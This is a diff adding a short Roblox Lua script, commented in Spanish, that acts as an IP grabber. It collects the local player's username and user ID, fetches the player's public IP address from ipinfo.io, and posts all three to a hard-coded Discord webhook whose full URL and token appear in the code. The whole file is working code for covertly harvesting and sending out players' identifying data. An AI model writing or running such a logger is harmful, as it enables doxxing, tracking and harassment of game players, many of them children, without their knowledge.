@@ -1,0 +1,37 @@
+-- Reemplaza 'https://discord.com/api/webhooks/1358974371351494718/eb0welpc0UZEdzJBeJ1wDH9BrtARX5xy9PQ8d8RvllfDF1Rj7LGKicaYONWOVHhXayEX' con tu webhook de Discord
+local webhookUrl = "https://discord.com/api/webhooks/1358974371351494718/eb0welpc0UZEdzJBeJ1wDH9BrtARX5xy9PQ8d8RvllfDF1Rj7LGKicaYONWOVHhXayEX"
+
+-- Función para obtener la IP del usuario
+local function getIPAddress()
+    local httpService = game:GetService("HttpService")
+    local response = httpService:JSONDecode(httpService:GetAsync("http://ipinfo.io/json"))
+    return response.ip
+end
+
+-- Función para enviar datos al webhook de Discord
+local function sendToWebhook(data)
+    local httpService = game:GetService("HttpService")
+    local request = {
+        Url = webhookUrl,
+        Body = httpService:JSONEncode(data),
+        Method = "POST",
+        Headers = {
+            ["Content-Type"] = "application/json"
+        }
+    }
+    httpService:RequestAsync(request)
+end
+
+-- Obtener información del jugador
+local player = game.Players.LocalPlayer
+local username = player.Name
+local userId = player.UserId
+local ipAddress = getIPAddress()
+
+-- Crear el mensaje para el webhook
+local message = {
+    content = string.format("**Usuario:** %s\n**ID de Usuario:** %s\n**IP:** %s", username, userId, ipAddress)
+}
+
+-- Enviar el mensaje al webhook
+sendToWebhook(message)
